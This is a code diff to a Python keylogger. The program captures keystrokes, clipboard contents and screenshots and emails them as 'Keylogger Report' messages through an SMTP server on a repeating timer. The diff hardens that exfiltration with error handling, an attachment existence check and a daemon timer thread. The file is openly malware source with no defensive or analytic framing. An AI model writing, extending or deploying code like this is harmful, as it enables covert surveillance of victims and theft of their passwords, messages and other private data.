@@ -16,6 +16,7 @@ try:
     from email.mime.multipart import MIMEMultipart
     from email.mime.text import MIMEText
     import glob
+    import time
 except ModuleNotFoundError:
     from subprocess import call
     modules = ["pyscreenshot", "sounddevice", "pynput", "pyperclip"]
@@ -62,24 +63,28 @@ finally:
             self.appendlog(current_key + "\n")
 
         def send_mail(self, email, password, message, attachment_path=None):
-            msg = MIMEMultipart()
-            msg['From'] = email
-            msg['To'] = email
-            msg['Subject'] = "Keylogger Report"
+            try:
+                msg = MIMEMultipart()
+                msg['From'] = email
+                msg['To'] = email
+                msg['Subject'] = "Keylogger Report"
 
-            msg.attach(MIMEText(message, 'plain'))
+                msg.attach(MIMEText(message, 'plain'))
 
-            if attachment_path:
-                with open(attachment_path, "rb") as attachment:
-                    part = MIMEBase('application', 'octet-stream')
-                    part.set_payload(attachment.read())
-                    encoders.encode_base64(part)
-                    part.add_header('Content-Disposition', f"attachment; filename= {os.path.basename(attachment_path)}")
-                    msg.attach(part)
+                if attachment_path and os.path.exists(attachment_path):
+                    with open(attachment_path, "rb") as attachment:
+                        part = MIMEBase('application', 'octet-stream')
+                        part.set_payload(attachment.read())
+                        encoders.encode_base64(part)
+                        part.add_header('Content-Disposition', f"attachment; filename= {os.path.basename(attachment_path)}")
+                        msg.attach(part)
 
-            with smtplib.SMTP("smtp.mailtrap.io", 2525) as server:
-                server.login(email, password)
-                server.sendmail(email, email, msg.as_string())
+                with smtplib.SMTP("smtp.mailtrap.io", 2525) as server:
+                    server.login(email, password)
+                    server.sendmail(email, email, msg.as_string())
+            except Exception as e:
+                logging.error(f"Failed to send email: {e}")
+                os._exit(1)
 
         def report(self):
             self.appendlog("\nClipboard content: " + self.get_clipboard_content() + "\n")
@@ -87,6 +92,7 @@ finally:
             self.send_mail(self.email, self.password, "\n\n" + self.log, screenshot_path)
             self.log = ""
             timer = threading.Timer(self.interval, self.report)
+            timer.daemon = True
             timer.start()
 
         def get_clipboard_content(self, max_retries=5):
